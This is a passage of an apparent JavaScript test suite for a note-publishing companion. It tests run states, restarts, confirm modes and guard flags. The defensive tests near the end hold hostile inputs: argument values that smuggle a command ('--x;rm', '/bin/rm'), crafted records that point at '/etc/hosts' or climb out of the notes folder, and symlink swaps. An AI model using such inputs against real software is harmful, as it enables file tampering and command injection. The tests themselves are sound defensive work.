// note, and the staging commit the site's prepare made stayed behind. Now it stays `failed`, keeps its retry, and abandons correctly.
test('a restart leaves a failed run failed: its retry is still offered, and abandoning a plan failure discards and removes the draft', async t => {
  const rig = makeRig({ prepare: true }); t.after(rig.done);
  rig.control({ plan: 'fail' });
  const b = boot(rig);
  assert.ok((await b.start()).ok);
  await until(() => b.mode().startsWith('failed_'), 'failed at plan');
  const before = b.pub.current();
  assert.equal(before.failed_step, 'plan');
  const note = noteOf(rig, before);
  assert.ok(fs.existsSync(note));
  // the companion restarts
  const again = R.createPublisher({ file: b.file, now: () => NOW, broadcast: () => {}, readConfig: () => ({ blyg_home: rig.home }), readPage: () => null, savePage: () => {} });
  const v = again.current();
  assert.deepEqual([v.mode, v.failed_step, v.can], ['failed_plan', 'plan', ['retry', 'abandon']]);
  assert.equal(R.canMove('failed_plan', 'interrupted_planning'), false, 'a failed run is never interrupted');
  const a = await again.abandon({ id: v.id, token: v.token });
  assert.ok(a.ok, JSON.stringify(a));
  assert.equal(a.view.mode, 'abandoned');
  assert.equal(a.view.cleanup.outcome, 'undone', 'the draft is removed: the run never reached apply');
  assert.ok(!fs.existsSync(note));
  assert.deepEqual(rig.calls().map(c => c.step), ['prepare', 'plan', 'discard'], 'discard ran (it undoes what prepare did); no abandon of an apply');
});

// A failed APPLY published nothing (the site applies in a temporary copy; only publish pushes). Abandoning it ends the site's own record
// (the abandon command) and then takes the draft away like a run before apply, so the next run is not refused by a note still staged.
// A failed PUBLISH may have pushed: its note is left (the test 'abandon: before apply the draft goes; after apply nothing is touched').
test('abandon after a failed apply: the site\'s abandon runs, then discard, and the draft goes; without an abandon command, discard alone', async t => {
  for (const withAbandon of [true, false]) {
    const rig = makeRig({ prepare: true }); t.after(rig.done);
    const cmd = step => [process.execPath, FAKE, rig.log, rig.ctl, step, '{note}'];
    const home = withAbandon ? { ...rig.home, commands: { ...rig.home.commands, abandon: cmd('abandon') } } : rig.home;
    rig.control({ apply: 'fail' });
    const b = boot(rig, { config: home });
    assert.ok((await b.start()).ok);
    await until(() => b.mode() === 'planned', 'planned');
    const p = b.pub.current();
    assert.ok(b.pub.confirm({ id: p.id, token: p.token }).ok);
    await until(() => b.mode().startsWith('failed_'), 'failed at apply');
    const v = b.pub.current();
    assert.equal(v.failed_step, 'apply');
    const note = noteOf(rig, v);
    const a = await b.pub.abandon({ id: v.id, token: v.token });
    assert.ok(a.ok, JSON.stringify(a));
    assert.equal(a.view.mode, 'abandoned');
    assert.equal(a.view.cleanup.outcome, 'undone', `the draft is taken away (${withAbandon})`);
    assert.ok(!fs.existsSync(note));
    assert.deepEqual(rig.calls().map(c => c.step), ['prepare', 'plan', 'apply', ...(withAbandon ? ['abandon'] : []), 'discard'], `${withAbandon}`);
    assert.match(a.view.cleanup.said, /^Nothing was published\. The draft was taken away\.$/);
  }
});

test('a restart leaves a failed apply failed: retry runs apply again', async t => {
  const rig = makeRig(); t.after(rig.done);
  rig.control({ apply: 'fail' });
  const b = boot(rig);
  assert.ok((await b.start()).ok);
  await until(() => b.mode() === 'planned', 'planned');
  const p = b.pub.current();
  assert.ok(b.pub.confirm({ id: p.id, token: p.token }).ok);
  await until(() => b.mode().startsWith('failed_'), 'failed at apply');
  rig.control({});
  const again = R.createPublisher({ file: b.file, now: () => NOW, broadcast: () => {}, readConfig: () => ({ blyg_home: rig.home }), readPage: () => null, savePage: () => {} });
  const v = again.current();
  assert.deepEqual([v.mode, v.failed_step, v.can], ['failed_apply', 'apply', ['retry', 'abandon']]);
  assert.ok(again.retry({ id: v.id, token: v.token }).ok);
  await until(() => again.current().mode === 'published', 'published after the retry');
  assert.deepEqual(rig.calls().map(c => c.step), ['plan', 'apply', 'apply', 'publish']);
});

test('a restart while preparing is interrupted like any other live mode', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bfp-prep-'));
  const file = path.join(dir, 'r.json');
  fs.writeFileSync(file, JSON.stringify({ mode: 'preparing', id: 'a', token: 't' }));
  assert.equal(new R.RunBook({ file }).mode, 'interrupted_preparing');
  fs.rmSync(dir, { recursive: true, force: true });
});

// ---- confirm: 'never' (the default): choosing Publish IS the publish -------------------------------------------
test('confirm never: prepare, plan, apply, publish run without stopping and the thread is marked; the guard flags ride on plan, apply AND publish (not on prepare or discard)', async t => {
  const rig = makeRig({ prepare: true, confirm: 'never', extra: { plan_guard: ['--only-note'] } }); t.after(rig.done);
  const b = boot(rig);
  const modes = [];
  b.events.push = e => { if (e.type === 'blyg-publish') modes.push(e.run.mode); return 0; };
  assert.ok((await b.start()).ok);
  await until(() => b.mode() === 'published', 'published');
  assert.deepEqual(modes, ['checking', 'drafted', 'preparing', 'planning', 'planned', 'applying', 'applied', 'publishing', 'published']);
  const calls = rig.calls();
  assert.deepEqual(calls.map(c => c.step), ['prepare', 'plan', 'apply', 'publish']);
  assert.deepEqual(calls.map(c => c.argv.includes('--only-note')), [false, true, true, true], 'prepare has none; plan, apply and publish all carry the guard');
  const v = b.pub.current();
  assert.equal(v.confirm, 'never');
  assert.ok(b.pages.get(b.page.url).threads[0].blyg_published);
});

test('confirm never: a plan that exits non-zero (the guard refusing, or anything else) stops the run before apply; nothing is applied or published', async t => {
  const rig = makeRig({ confirm: 'never', extra: { plan_guard: ['--only-note'] } }); t.after(rig.done);
  rig.control({ plan: 'fail' });
  const b = boot(rig);
  (await b.start()); await until(() => b.mode().startsWith('failed_'), 'failed');
  assert.equal(b.pub.current().failed_step, 'plan');
  await sleep(250);
  assert.deepEqual(rig.calls().map(c => c.step), ['plan']);
  assert.equal(b.pages.get(b.page.url).threads[0].blyg_published, undefined);
});

test('confirm always: the guard is added there too, and the run waits at planned for the click', async t => {
  const rig = makeRig({ confirm: 'always', extra: { plan_guard: ['--only-note'] } }); t.after(rig.done);
  const b = boot(rig);
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  await sleep(250);
  assert.equal(b.mode(), 'planned', 'it waits');
  const plan = rig.calls().find(c => !c.argv.includes('--prepare-note') && !c.argv.includes('--preflight')) || rig.calls()[0];
  assert.ok(plan.argv.includes('--only-note'), 'a set guard is used in every confirm mode');
  assert.equal(b.pub.current().confirm, 'always');
});

test('confirm and plan_guard are validated; the default is always, and never needs a guard; a settings change after the start is still refused', async t => {
  const rig = makeRig(); t.after(rig.done);
  const base = { ...rig.home }; delete base.confirm;
  assert.equal(H.validateHome(base).settings.confirm, 'always');
  assert.match(H.validateHome({ ...base, confirm: 'never' }).errors.join(), /needs a plan_guard/, 'never without a guard is refused');
  assert.match(H.validateHome({ ...base, confirm: 'never', plan_guard: [] }).errors.join(), /needs a plan_guard/);
  assert.ok(H.validateHome({ ...base, confirm: 'never', plan_guard: ['--only-note'] }).ok);
  const noDiscard = { ...base, commands: { ...base.commands, prepare: base.commands.plan } };
  assert.match(H.validateHome(noDiscard).errors.join(), /prepare command needs a discard command/);
  assert.equal(H.validateHome(base).settings.plan_guard.length, 0);
  assert.deepEqual(H.CONFIRMS, ['never', 'always']);
  for (const bad of ['sometimes', 'NEVER', 5]) assert.match(H.validateHome({ ...base, confirm: bad }).errors.join(), /confirm must be one of/, String(bad));
  for (const bad of ['--only-note', ['only-note'], ['/bin/rm'], ['--x y'], ['--x;rm'], [5], ['--a', '--b', '--c', '--d', '--e', '--f', '--g', '--h', '--i'], ['-' + 'x'.repeat(90)]]) {
    assert.match(H.validateHome({ ...base, plan_guard: bad }).errors.join(), /plan_guard must be a list/, JSON.stringify(bad));
  }
  assert.ok(H.validateHome({ ...base, plan_guard: ['--only-note', '-x=1'] }).ok);
  assert.notEqual(H.fingerprint(H.validateHome({ ...base, confirm: 'never', plan_guard: ['--g'] }).settings), H.fingerprint(H.validateHome({ ...base, confirm: 'always' }).settings), 'changing it mid-run stops the next step');
});

test('the guard rides on every apply and publish, retries included (a failed publish retried by the owner carries it again)', async t => {
  const rig = makeRig({ confirm: 'never', extra: { plan_guard: ['--only-note'] } }); t.after(rig.done);
  rig.control({ publish: 'fail' });
  const b = boot(rig);
  (await b.start()); await until(() => b.mode().startsWith('failed_'), 'failed at publish');
  const v = b.pub.current();
  rig.control({});
  await b.pub.retry({ id: v.id, token: v.token });
  await until(() => b.mode() === 'published', 'published after the retry');
  const calls = rig.calls();
  assert.deepEqual(calls.map(c => [c.step, c.argv.includes('--only-note')]), [['plan', true], ['apply', true], ['publish', true], ['publish', true]]);
});

// ---- an interrupted apply or publish is CONTINUED (a named move), or abandoned through the site's own abandon command -------------
test('continue is a named move, guarded by the step that was interrupted: only apply and publish, never plan, prepare or a failure', () => {
  for (const [from, ok] of [['applying', 'applying'], ['applied', 'publishing'], ['publishing', 'publishing'], ['preparing', ''], ['planning', ''], ['planned', ''], ['drafted', ''], ['unknown', '']]) {
    const run = { mode: 'interrupted_' + from };
    for (const to of ['applying', 'publishing', 'planning', 'preparing', 'applied']) assert.equal(R.canMove(run.mode, to), to === ok && !!ok, `${from} → ${to}`);
    assert.ok(R.canMove(run.mode, 'abandoned'));
    assert.deepEqual(R.actionsOf(run), ok ? ['continue', 'abandon'] : ['abandon'], from);
  }
});

test('the companion is killed mid-publish with the fake command; after a restart the owner continues and the post is published (the same step runs again)', async t => {
  const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
  const mk = () => boot(rig);
  let b = mk();
  rig.control({ publish: 'sleep' });
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  await b.pub.confirm({ id: v.id, token: v.token });
  await until(() => rig.calls().filter(c => c.step === 'publish').length === 1, 'publish started');
  // the companion dies: its record says publishing; a new one starts from the file
  const sleeper = rig.calls().at(-1).pid;
  const file = path.join(rig.out, 'run.json');
  const rec = JSON.parse(fs.readFileSync(file, 'utf8'));
  assert.equal(rec.mode, 'publishing');
  b.pub.stopAll();
  await sleep(100);
  try { process.kill(sleeper, 'SIGKILL'); } catch { /* gone */ }
  const pages = b.pages;
  fs.writeFileSync(file, JSON.stringify(rec));
  const events = [];
  const pub2 = R.createPublisher({ file, now: () => NOW, broadcast: e => events.push(e), readConfig: () => ({ blyg_home: rig.home }), readPage: u => pages.get(u), savePage: p => pages.set(p.url, p) });
  v = pub2.current();
  assert.deepEqual([v.mode, v.interrupted_from, v.can], ['interrupted_publishing', 'publishing', ['continue', 'abandon']]);
  rig.control({});
  assert.equal((await pub2.carryOn({ id: v.id, token: 'x'.repeat(v.token.length) })).status, 404, 'with the run\'s own token only');
  assert.ok((await pub2.carryOn({ id: v.id, token: v.token })).ok);
  await until(() => pub2.current().mode === 'published', 'published after continuing');
  assert.equal(rig.calls().filter(c => c.step === 'publish').length, 2, 'the publish step ran again, nothing else did');
  assert.deepEqual(rig.calls().map(c => c.step), ['plan', 'apply', 'publish', 'publish']);
  assert.equal(pages.get(b.page.url).threads[0].blyg_published.title.length > 0, true);
  assert.equal((await pub2.carryOn({ id: v.id, token: v.token })).status, 409, 'once');
});

test('restart, then abandon after apply: the site\'s own abandon command runs (no hand-editing), the note stays; a failing abandon command is reported and the run waits in abandon_failed (abandon again or forget)', async t => {
  const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
  const cmd = step => [process.execPath, FAKE, rig.log, rig.ctl, step, '{note}'];
  const home = { ...rig.home, commands: { ...rig.home.commands, abandon: cmd('abandon') } };
  const rigx = { ...rig, home };
  const b = boot(rigx);
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  rig.control({ publish: 'sleep' });
  await b.pub.confirm({ id: v.id, token: v.token });
  await until(() => rig.calls().filter(c => c.step === 'publish').length === 1, 'publish started');
  const rec = JSON.parse(fs.readFileSync(path.join(rig.out, 'run.json'), 'utf8'));
  b.pub.stopAll(); await sleep(100);
  const file = path.join(rig.out, 'run2.json');
  fs.writeFileSync(file, JSON.stringify(rec));
  const mk = () => R.createPublisher({ file, now: () => NOW, broadcast: () => {}, readConfig: () => ({ blyg_home: home }), readPage: () => null, savePage: () => {} });
  let pub = mk();
  v = pub.current();
  assert.ok(v.mode.startsWith('interrupted_'), v.mode);
  rig.control({ abandon: 'fail' });
  const bad = await pub.abandon({ id: v.id, token: v.token });
  assert.equal(bad.ok, false);
  assert.match(bad.error, /^Your site could not give this publish up\. You can try again, or forget it here \(nothing is run on your site\)\.$/);
  assert.match(recOf(v).abandon_failure, /abandon exited with code 1/, 'the reason is in the record (and the log)');
  assert.equal(pub.current().mode, 'abandon_failed', 'not abandoned while the site\'s own abandon failed: it waits, offering abandon or forget');
  rig.control({});
  const ok = await pub.abandon({ id: v.id, token: v.token });
  assert.ok(ok.ok, ok.error);
  assert.deepEqual(rig.calls().map(c => c.step).slice(-2), ['abandon', 'abandon']);
  assert.equal(pub.current().mode, 'abandoned');
  assert.ok(fs.existsSync(path.join(rig.top, recOf(v).note_rel)), 'after apply the note is left alone');
  // a new run may start
  assert.equal(mk().current().mode, 'abandoned');
});

// ---- the note file under attack between the check and the write (each of these killed a surviving mutant) ----------------
test('a file that appears under the chosen name after the choice is never overwritten (O_EXCL), and nothing is run', async t => {
  const rig = makeRig(); t.after(rig.done);
  const b = boot(rig, { hook: { beforeWrite: target => fs.writeFileSync(target, 'THE OWNER\'S OWN FILE, appeared a moment ago') } });
  const r = (await b.start());
  assert.equal(r.ok, false); assert.equal(r.status, 409);
  assert.match(r.error, /appeared meanwhile/);
  assert.equal(fs.readFileSync(path.join(rig.folder, 'first-thought-about-liveness.md'), 'utf8'), 'THE OWNER\'S OWN FILE, appeared a moment ago');
  assert.deepEqual(rig.calls(), []);
});

test('the notes folder swapped for a link to somewhere else after validation: nothing is written outside it', async t => {
  const rig = makeRig(); t.after(rig.done);
  const elsewhere = fs.mkdtempSync(path.join(os.tmpdir(), 'bfp-elsewhere-')); t.after(() => fs.rmSync(elsewhere, { recursive: true, force: true }));
  const b = boot(rig, { hook: { beforeWrite: () => { fs.renameSync(rig.folder, rig.folder + '-moved'); fs.symlinkSync(elsewhere, rig.folder); } } });
  const r = (await b.start());
  assert.equal(r.ok, false);
  assert.match(r.error, /outside your notes folder/);
  assert.deepEqual(fs.readdirSync(elsewhere), [], 'nothing landed in the place the link points to');
});

test('cancel re-checks the note right before removing it: an edit made after the first check keeps the file', async t => {
  const rig = makeRig(); t.after(rig.done);
  const b = boot(rig, { hook: { beforeUnlink: abs => fs.appendFileSync(abs, '\nthe owner edited this at the last moment\n') } });
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  const v = b.pub.current();
  const c = await b.pub.cancel({ id: v.id, token: v.token });
  assert.ok(c.ok);
  assert.equal(fs.existsSync(path.join(rig.top, recOf(v).note_rel)), true, 'the note is still there');
  assert.match(c.view.cleanup.said, /changed\. Your note was left as it is/);
  // and a link put in its place is never followed or removed as the note
  const b2 = boot(rig, { hook: { beforeUnlink: abs => { const keep = abs + '.keep'; fs.renameSync(abs, keep); fs.symlinkSync(keep, abs); } } });
  (await b2.start()); await until(() => b2.mode() === 'planned', 'planned 2');
  const v2 = b2.pub.current();
  await b2.pub.cancel({ id: v2.id, token: v2.token });
  assert.ok(fs.lstatSync(path.join(rig.top, recOf(v2).note_rel)).isSymbolicLink(), 'a link is left, not unlinked as if it were the note');
});

test('published_marker: a publish that exits 0 without the done marker is failed(publish) with its output, nothing is stamped, and Retry is offered; with the marker it publishes', async t => {
  const rig = makeRig({ confirm: 'always', extra: { published_marker: 'State: merged_back' } }); t.after(rig.done);
  const cmd = args => [process.execPath, '-e', `console.log("some output");console.log(${JSON.stringify(args)})`, 'x', '{note}'];
  const home = { ...rig.home, commands: { ...rig.home.commands, publish: cmd('State: applied') } };
  const b = boot(rig, { config: home });
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  const v = b.pub.current();
  await b.pub.confirm({ id: v.id, token: v.token });
  await until(() => b.mode().startsWith('failed_'), 'failed at publish');
  const f = b.pub.current();
  assert.equal(f.failed_step, 'publish');
  assert.match(recOf(f).failed_reason, /exited 0 but did not finish \(it ended at “State: applied”, not “State: merged_back”\): nothing was published/);
  assert.match(recOf(f).steps.at(-1).output, /State: applied/);
  assert.equal(b.pages.get(b.page.url).threads[0].blyg_published, undefined, 'the thread is not stamped');
  assert.deepEqual(f.can, ['retry', 'abandon']);
  // no marker line at all, an earlier marker followed by another State line: also not done
  for (const out of ['no state line here', 'State: merged_back\nState: planned']) {
    const rig2 = makeRig({ confirm: 'always', extra: { published_marker: 'State: merged_back' } }); t.after(rig2.done);
    const c2 = o => [process.execPath, '-e', `console.log(${JSON.stringify(o)})`, 'x', '{note}'];
    const b2 = boot(rig2, { config: { ...rig2.home, commands: { ...rig2.home.commands, publish: c2(out) } } });
    (await b2.start()); await until(() => b2.mode() === 'planned', 'p'); const v2 = b2.pub.current();
    await b2.pub.confirm({ id: v2.id, token: v2.token }); await until(() => b2.mode().startsWith('failed_'), 'f');
  }
  const okcmd = [process.execPath, '-e', 'console.log("State: merged_back")', 'x', '{note}'];
  const rig3 = makeRig({ confirm: 'always', extra: { published_marker: 'State: merged_back' } }); t.after(rig3.done);
  const b3 = boot(rig3, { config: { ...rig3.home, commands: { ...rig3.home.commands, publish: okcmd } } });
  (await b3.start()); await until(() => b3.mode() === 'planned', 'p3'); const v3 = b3.pub.current();
  await b3.pub.confirm({ id: v3.id, token: v3.token }); await until(() => b3.mode() === 'published', 'published with the marker');
  assert.ok(b3.pages.get(b3.page.url).threads[0].blyg_published);
  assert.match(H.validateHome({ ...rig.home, published_marker: 'a\nb' }).errors.join(), /published_marker must be one line/);
  assert.equal(H.validateHome({ ...rig.home, published_marker: undefined }).settings.published_marker, '', 'without it the exit code decides');
});

test('the abandon command must carry {note} (so the site\'s command ends only THAT note\'s run) and gets the note\'s path as one argument', async t => {
  const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
  const noNote = { ...rig.home, commands: { ...rig.home.commands, abandon: [process.execPath, FAKE, rig.log, rig.ctl, 'abandon'] } };
  assert.match(H.validateHome(noNote).errors.join(), /command “abandon” must have \{note\}/);
  const cmd = step => [process.execPath, FAKE, rig.log, rig.ctl, step, '{note}'];
  const home = { ...rig.home, commands: { ...rig.home.commands, abandon: cmd('abandon') } };
  const b = boot(rig, { config: home });
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  const v = b.pub.current();
  rig.control({ publish: 'sleep' });
  await b.pub.confirm({ id: v.id, token: v.token });
  await until(() => rig.calls().filter(c => c.step === 'publish').length === 1, 'publishing');
  b.pub.stopAll(); await sleep(150);
  const rec = JSON.parse(fs.readFileSync(path.join(rig.out, 'run.json'), 'utf8'));
  const file = path.join(rig.out, 'run3.json'); fs.writeFileSync(file, JSON.stringify(rec));
  const pub = R.createPublisher({ file, now: () => NOW, broadcast: () => {}, readConfig: () => ({ blyg_home: home }), readPage: () => null, savePage: () => {} });
  const v2 = pub.current();
  rig.control({});
  assert.ok((await pub.abandon({ id: v2.id, token: v2.token })).ok);
  assert.equal(rig.calls().at(-1).step, 'abandon');
  assert.equal(rig.calls().at(-1).argv[3], recOf(v).note_rel, 'the abandon command was told which note');
});

test('abandon after apply runs the site\'s abandon command only with the settings the run started under (a changed setting never reaches a command)', async t => {
  const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
  const cmd = step => [process.execPath, FAKE, rig.log, rig.ctl, step, '{note}'];
  const home = { ...rig.home, commands: { ...rig.home.commands, abandon: cmd('abandon') } };
  const file = path.join(rig.out, 'run4.json');
  // a REAL note, unchanged (not a tainted record: that path runs nothing for another reason, so it never tested this check — mutant M23)
  fs.writeFileSync(path.join(rig.folder, 'x.md'), 'T');
  const noteSha = crypto.createHash('sha256').update('T').digest('hex');
  fs.writeFileSync(file, JSON.stringify({ mode: 'publishing', id: 'abc', token: 'tok', note_rel: '_notes/x.md', note_sha: noteSha, settings_fp: 'not-the-fingerprint-of-these-settings', steps: [{ step: 'apply', exit: 0, output: 'A' }], thread_ids: ['t1'], page_url: 'u' }));
  const pub = R.createPublisher({ file, now: () => NOW, broadcast: () => {}, readConfig: () => ({ blyg_home: home }), readPage: () => null, savePage: () => {} });
  const v = pub.current();
  assert.ok(v.mode.startsWith('interrupted_'));
  assert.ok(!v.tainted, 'the record is sound: only the settings changed');
  const a = await pub.abandon({ id: 'abc', token: 'tok' });
  assert.deepEqual([a.ok, a.view && a.view.mode], [true, 'abandoned'], JSON.stringify(a).slice(0, 300));
  assert.deepEqual(rig.calls(), [], 'no command ran under changed settings');
  assert.ok(fs.existsSync(path.join(rig.folder, 'x.md')), 'and the note is left (after apply)');
});

test('F7: a start whose shown setting is not the one in force is refused with a plain message and starts nothing (a stale drawer cannot promise a look first, or the reverse)', async t => {
  const rig = makeRig({ confirm: 'never', extra: { plan_guard: ['--only-note'] } }); t.after(rig.done);
  const b = boot(rig);
  for (const shown of ['always', '', undefined, 'sometimes']) {
    const r = (await b.start('t1', 'one', shown === undefined ? null : shown));
    assert.equal(r.ok, false, String(shown)); assert.equal(r.status, 409);
    assert.match(r.error, /The setting changed: your drawer showed .* but “never” is in force \(one click publishes\)\. Nothing was started/);
  }
  assert.deepEqual(fs.readdirSync(rig.folder), [], 'no note written');
  assert.deepEqual(rig.calls(), []);
  assert.equal(b.mode(), 'idle');
  const rig2 = makeRig({ confirm: 'always' }); t.after(rig2.done);
  const b2 = boot(rig2);
  const r2 = (await b2.start('t1', 'one', 'never'));
  assert.match(r2.error, /“always” is in force \(you will see the note first\)/);
  assert.ok((await b2.start('t1', 'one', 'always')).ok);
});

// ---- F9: the record on disk is not trusted -------------------------------------------------------------------------------------------
test('a crafted or damaged record is shown as interrupted with only "abandon": nothing runs, and abandon neither passes nor deletes its path', async t => {
  const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
  const sha256 = x => crypto.createHash('sha256').update(x).digest('hex');
  const canary = path.join(rig.out, 'canary.txt'); fs.writeFileSync(canary, 'DO NOT TOUCH');
  const real = path.join(rig.folder, 'real.md'); fs.writeFileSync(real, 'REAL');
  fs.symlinkSync(canary, path.join(rig.folder, 'link.md'));
  const outside = path.join(rig.top, 'outside.md'); fs.writeFileSync(outside, 'ELSEWHERE IN THE TREE');
  const cases = {
    'a path that climbs out': { note_rel: path.relative(rig.top, canary), note_sha: sha256('DO NOT TOUCH') },
    '/etc/hosts': { note_rel: '/etc/hosts', note_sha: sha256('x') },
    'a dot-dot spelling': { note_rel: '_notes/../outside.md', note_sha: sha256('ELSEWHERE IN THE TREE') },
    'a file in the tree but outside the notes folder': { note_rel: 'outside.md', note_sha: sha256('ELSEWHERE IN THE TREE') },
    'a link inside the folder to a file outside it': { note_rel: '_notes/link.md', note_sha: sha256('DO NOT TOUCH') },
    'a note whose hash is not the recorded one': { note_rel: '_notes/real.md', note_sha: sha256('WHAT WAS SHOWN') },
    'a note that is gone': { note_rel: '_notes/nothing-here.md', note_sha: sha256('x') },
    'no path at all': { note_rel: 5, note_sha: 'x' },
  };
  for (const [name, bad] of Object.entries(cases)) {
    for (const mode of ['applying', 'publishing']) {
      const file = path.join(rig.out, `taint-${mode}.json`);
      fs.writeFileSync(file, JSON.stringify({ mode, id: 'abc', token: 'tok', steps: [{ step: 'apply', exit: 0, output: 'A' }], settings_fp: 'x', thread_ids: ['t1'], page_url: 'u', ...bad }));
      const pub = R.createPublisher({ file, readConfig: () => ({ blyg_home: { ...rig.home, commands: { ...rig.home.commands, abandon: [process.execPath, FAKE, rig.log, rig.ctl, 'abandon', '{note}'] } } }), readPage: () => null, savePage: () => {}, broadcast: () => {} });
      const v = pub.current();
      assert.deepEqual([v.mode, v.can], ['interrupted_' + mode, ['abandon']], `${name} (${mode})`);
      assert.ok(v.tainted, name);
      for (const act of ['carryOn', 'retry', 'confirm']) assert.equal((await pub[act]({ id: 'abc', token: 'tok' })).status, 409, `${name}: ${act}`);
      const a = await pub.abandon({ id: 'abc', token: 'tok' });
      assert.ok(a.ok, name);
      assert.match(a.view.cleanup.said, /Nothing was run or removed/);
    }
  }
  assert.deepEqual(rig.calls(), [], 'no command was ever run with any of those paths');
  assert.equal(fs.readFileSync(canary, 'utf8'), 'DO NOT TOUCH'); assert.ok(fs.existsSync(real) && fs.existsSync(outside));
});

test('a step whose process outlived the companion is never run twice: Continue is refused while it lives, and runs only after the owner chooses to stop it', async t => {
  const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
  // a stand-in for `ps -o lstart=` that answers for a live pid (so this runs where ps cannot, e.g. in a sandbox)
  const fakePs = pid => { try { process.kill(pid, 0); return `T${pid}`; } catch { return ''; } };
  const b = boot(rig, { lstartOf: fakePs });
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  rig.control({ publish: 'sleep' });
  await b.pub.confirm({ id: v.id, token: v.token });
  await until(() => rig.calls().filter(c => c.step === 'publish').length === 1, 'publish running');
  const sleeper = rig.calls().at(-1).pid;
  const rec = JSON.parse(fs.readFileSync(path.join(rig.out, 'run.json'), 'utf8'));
  assert.equal(rec.child.pgid, sleeper, 'the record keeps the step\'s process group');
  // the companion dies without taking the step with it: a new one reads the file
  const file = path.join(rig.out, 'run5.json'); fs.writeFileSync(file, JSON.stringify(rec));
  const pub = R.createPublisher({ file, now: () => NOW, broadcast: () => {}, lstartOf: fakePs, readConfig: () => ({ blyg_home: rig.home }), readPage: u => b.pages.get(u), savePage: p => b.pages.set(p.url, p) });
  v = pub.current();
  assert.deepEqual([v.mode.startsWith('interrupted_'), v.can, v.earlier_step], [true, ['stop-and-continue', 'stop-and-abandon'], 'alive']);
  // abandon and forget look afresh too: refused while it lives (stop it first), and nothing is run on the site
  const ab = await pub.abandon({ id: v.id, token: v.token });
  assert.deepEqual([ab.status, /The earlier step is still running: stop it first/.test(ab.error)], [409, true]);
  const fg = await pub.forget({ id: v.id, token: v.token, sure: true });
  assert.deepEqual([fg.status, /stop it first/.test(fg.error)], [409, true]);
  assert.ok(!rig.calls().some(c => c.step === 'abandon'), 'the site\'s abandon never ran');
  const refused = await pub.carryOn({ id: v.id, token: v.token });
  assert.equal(refused.status, 409);
  assert.match(refused.error, /The earlier step is still running/);
  assert.equal(rig.calls().filter(c => c.step === 'publish').length, 1, 'no second copy was started');
  rig.control({});
  const go = await pub.carryOn({ id: v.id, token: v.token, stop: true });
  assert.ok(go.ok, go.error);
  await until(() => pub.current().mode === 'published', 'published');
  assert.equal(R.childState({ pgid: sleeper, lstart: `T${sleeper}` }, fakePs), 'gone', 'the earlier copy is gone');
  assert.equal(rig.calls().filter(c => c.step === 'publish').length, 2);
  b.pub.stopAll();
});

test('childState: none, gone (no such group, malformed, or the number now belongs to another process), alive (same start time), unknown (ps failed then or now)', () => {
  assert.equal(R.childState(null), 'none'); assert.equal(R.childState({ pgid: 'x' }), 'gone'); assert.equal(R.childState({ pgid: 1 }), 'gone');
  assert.equal(R.childState({ pgid: 2 ** 22 - 3, lstart: 'x' }), 'gone');
  const me = process.pid;
  // (process.kill(-pid) needs a group: this test process leads none, so a real group is made by a detached sleeper)
  const sl = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 30000)'], { detached: true, stdio: 'ignore' });
  try {
    const g = sl.pid;
    assert.equal(R.childState({ pgid: g, lstart: 'S' }, () => 'S'), 'alive');
    assert.equal(R.childState({ pgid: g, lstart: 'S' }, () => 'OTHER'), 'gone', 'same number, another start time: another process');
    assert.equal(R.childState({ pgid: g, lstart: '' }, () => 'S'), 'unknown', 'ps failed when it was recorded');
    assert.equal(R.childState({ pgid: g, lstart: 'S' }, () => ''), 'unknown', 'ps fails now');
  } finally { try { process.kill(-sl.pid, 'SIGKILL'); } catch { /* gone */ } }
  void me;
  let ps = false; try { ps = !!execFileSync('ps', ['-o', 'lstart=', '-p', String(process.pid)], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim(); } catch { ps = false; }
  if (ps) assert.equal(R.childAlive({ pgid: process.pid, lstart: 'Mon Jan  1 00:00:00 2001' }), false, 'same number, different start time: another process');
});

test('F10: while a step runs the view says which step and how long it has gone (never a silent half hour), never what it printed; nothing of it after; a publish says when it is waiting for the site', async t => {
  const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
  const slow = [process.execPath, '-e', 'console.log("first line");console.log("building page 3 of 9\\u001b[31m");setTimeout(()=>{},1200)', 'x', '{note}'];
  const pushing = [process.execPath, '-e', 'console.log("Pushed main abc1234: publishing.");setTimeout(()=>{console.log("State: merged_back")},1200)', 'x', '{note}'];
  const home = { ...rig.home, commands: { ...rig.home.commands, apply: slow, publish: pushing } };
  const b = boot(rig, { config: home });
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  const v = b.pub.current();
  assert.equal(v.running, undefined, 'nothing running while it waits for the owner');
  await b.pub.confirm({ id: v.id, token: v.token });
  const seen = await until(() => { const c = b.pub.current(); return c.running && c.running.step === 'apply' ? c : null; }, 'apply running');
  assert.deepEqual([seen.running.step, seen.mode, 'last_line' in seen.running], ['apply', 'applying', false], 'which step, never its output');
  await sleep(300);
  assert.ok(b.pub.current().running.elapsed_ms >= 250, 'elapsed time grows');
  const wait = await until(() => { const c = b.pub.current(); return c.running && c.running.phase === 'wait' ? c : null; }, 'publish: waiting for the site');
  assert.equal(wait.running.step, 'publish');
  await until(() => b.mode() === 'published', 'published');
  assert.equal(b.pub.current().running, undefined);
  assert.equal(H.TIME_LIMITS_MS.apply, 1_800_000);
});

test('the pre-flight check runs before anything is written; its own sentence refuses the start; no check set: no change', async t => {
  const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
